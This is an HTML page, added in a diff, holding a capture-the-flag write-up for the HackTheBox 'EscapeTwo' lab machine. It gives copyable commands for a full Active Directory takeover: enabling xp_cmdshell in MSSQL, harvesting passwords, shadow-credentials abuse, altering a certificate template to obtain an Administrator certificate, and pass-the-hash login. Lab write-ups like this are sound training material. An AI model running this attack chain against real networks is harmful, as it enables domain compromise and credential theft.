@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HackTheBox-EscapeTwo-WriteUp</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        html, body {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: white; /* Yazı rengini beyaz yapar */
+        }
+        
+        body {
+            background-image: url('pics/bg5.jpg'); /* Arka plan resmi */
+            background-size: cover; /* Resmi ekran boyutuna göre ayarlar */
+            background-position: center; /* Resmi ortalar */
+            background-repeat: no-repeat; /* Resmin tekrarlanmasını engeller */
+            background-attachment: fixed; /* Arka planın sabit kalmasını sağlar */
+        }
+
+        .overlay {
+            background: rgba(0, 0, 0, 0.7); /* Siyah bir örtü ekler */
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 20px;
+            background: rgba(255, 0, 0, 0.3); /* Kırmızı yarı saydam bir arka plan */
+            border-radius: 10px;
+        }
+        
+        .photo-container {
+            margin: 10px 0;
+        }
+        
+        .photo-container img {
+            width: calc(100% - 20px); /* Kenarlarda 20px boşluk bırakır */
+            height: auto; /* En-boy oranını korur */
+            object-fit: cover;
+            border-radius: 0; /* Köşe yuvarlamasını kaldırır */
+            margin: 10px; /* Boşluk ekler */
+        }
+        
+        .photo-container p {
+            font-size: 24px;
+            line-height: 1.5;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .code-block {
+            position: relative;
+            background-color: #ffffff;
+            padding: 10px;
+            border-radius: 5px;
+            width: calc(100% - 20px); /* Tam genişlik */
+            margin: 10px; /* Boşluk ekler */
+            overflow-x: auto; /* Yatay kaydırma çubuğu ekler */
+        }
+        
+        .code-block button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            padding: 5px 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 14px; /* Buton yazı boyutunu ayarlar */
+        }
+        
+        .code-block pre {
+            margin: 0;
+            padding: 10px;
+            width: 100%; /* Tam genişlik */
+            white-space: pre; /* Satır kaymasını engeller */
+            font-size: 14px; /* Kod yazı boyutunu ayarlar */
+            color:black;
+            font-family: Arial, sans-serif;
+            overflow-x: auto; /* Yatay kaydırma çubuğu ekler */
+        }
+        
+        .code-block pre code {
+            display: block;
+            overflow-x: auto; /* Yatay kaydırma çubuğu ekler */
+            padding: 10px;
+            white-space: nowrap; /* Satır kaymasını engeller */
+        }
+        
+    </style>
+</head>
+<body>
+    <!--<div class="overlay"></div>  Siyah örtü -->
+    <div class="container">
+        <div class="photo-container">
+            <p><a href="https://app.hackthebox.com/machines/EscapeTwo">Link to room on HackTheBox</a></p>
+            <p>Welcome to my HackTheBox-EscapeTwo-WriteUp! first we add machine ip to our /etc/hosts file with this command:</p> 
+                        <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>echo "10.10.11.51 escapetwo.htb" >> /etc/hosts</code></pre></div>
+            <p>then we start enumeration with rustscan:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>rustscan -a 10.10.11.51 -- -sC -sV</code></pre></div>
+            <img src="pics/et1.png" alt="Image 1">
+            <p>we see so many ports are open and there is no useful exploit for this versions of services. So we keep enumerating on smb:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>smbclient -U rose --password='KxEPkKe6R8su' -L 10.10.11.51</code></pre></div>
+        </div>
+        <div class="photo-container">
+            <img src="pics/et2.png" alt="Image 2">
+            <p>to connect smb shares we can use metasploit with this commands</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>msfconsole -q</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>use auxiliary/scanner/smb/smb_login</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set RHOSTS 10.10.11.51</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set SMBUser rose</code></pre></div> 
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set SMBPass 'KxEPkKe6R8su'</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>set CreateSession true</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>run</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>sessions -i 1</code></pre></div>
+        </div>
+        <div class="photo-container">
+            <img src="pics/et3.png" alt="Image 3">
+            <p>we see some smb shares. Inside of Accounting Department Disk we find two files and in accounts.xlsx we find four users and their passwords</p>
+        </div>
+        <p></p>
+        <div class="photo-container">
+            <img src="pics/et4.png" alt="Image 4">
+            <p>From rustscan output we see that there is mssql service in port 1433. And in these accounts user sa looks like mssql user. To connect mssql service we can use <a href="https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py">https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py</a>  with this command</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>python3 mssqlclient.py sequel.htb/sa:"MSSQLP@ssw0rd!"@10.10.11.51</code></pre></div> 
+        </div>
+        <div class="photo-container">
+            <img src="pics/et5.png" alt="Image 5">
+            <p>We see we cant run system commands with xp_cmdshell . We need to enable it with this commands</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>EXEC sp_configure 'xp_cmdshell', 1;</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>RECONFIGURE;</code></pre></div>
+        </div>
+        <div class="photo-container">
+            <p>And now we can run system commands (after running some commands mssql will reset xp_cmdshell. To run commands again just configure it again). After some enumeration we find sqlserver2019 configuration file</p>
+            <img src="pics/et6.png" alt="Image 6">
+            <p>We can read it with this command</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>EXEC xp_cmdshell "type c:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI";</code></pre></div>
+        </div>
+        <div class="photo-container">    
+            <img src="pics/et7.png" alt="Image 7">
+            <p>From output we see some passwords . We cant use evil-winrm with sql_svc user. After checking c:\Users we see there is another user named ryan and we can use his username and sql_svc password to get a shell</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'</code></pre></div>
+        </div>
+        <div class="photo-container">
+            <img src="pics/et8.png" alt="Image 8">
+        </div>
+        <div class="photo-container">
+            <p>After that we can use bloodhound-python to enumerate AD</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.10.11.51 -c All --zip</code></pre></div>
+            <p>after importing zip file to bloodhound we see three kerberoastable accounts</p>
+            <img src="pics/et9.png" alt="Image 9">
+            <p>We can try to make ryan owner of ca_svc with this command</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>bloodyAD --host 10.10.11.51 -d escapetwo.htb -u ryan -p WqSZAF6CysDQbGb3 set owner CA_SVC ryan</code></pre></div>
+            <p>After running this command we see it allowed us. To get full control of user ca_svc we can use impacket-dacledit like this</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>echo "10.10.11.51 sequel.htb" >> /etc/hosts</code></pre></div>
+
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
+</code></pre></div>
+        </div>
+        <div class="photo-container">
+            <p>After giving full control to get hash of user ca_svc we need to make shadow credendentials attack. This attack adds key of user ryan to msDS-KeyCredentialLink of user ca_svc . After that user ryan becomes a copy account of user ca_svc. For to do this we can use certipy tool like this </p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'</code></pre></div>
+        </div>
+        <div class="photo-container">
+            <img src="pics/et10.png" alt="Image 10">
+            <p>Now we have ntlm hash of user ca_svc. With this user we can control certificates that determine user authorizations. We can change templates to escalate our privileges. But first we need to learn template name with this command</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>certipy find -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51</code></pre></div>
+        </div>
+        <div class="photo-container">    
+            <img src="pics/et11.png" alt="Image 11">
+            <p>From this output we learn that template name is DunderMifflinAuthentication . We can change template to escalate our privileges with this command</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>KRB5CCNAME=$PWD/ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb</code></pre></div>
+            <p>After updating template we can get certificate of administrator with this commands</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>echo "10.10.11.51 dc01.sequel.htb" >> /etc/hosts</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>certipy req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target dc01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51</code></pre></div>
+            <p>After this we have Administrator's certificate . We can get hash of Administrator with this command</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>certipy auth -pfx administrator_10.pfx -domain sequel.htb</code></pre></div>
+            <p>and finally we can login with evil-winrm with this command</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>evil-winrm -i 10.10.11.51 -u Administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'</code></pre></div>
+        </div>
+        <div class="photo-container">
+            <img src="pics/et12.png" alt="Image 12">
+            <p>and done. We are Administrator. Thanks for reading!</p>
+        </div>
+    </div>
+</body>
+</html>
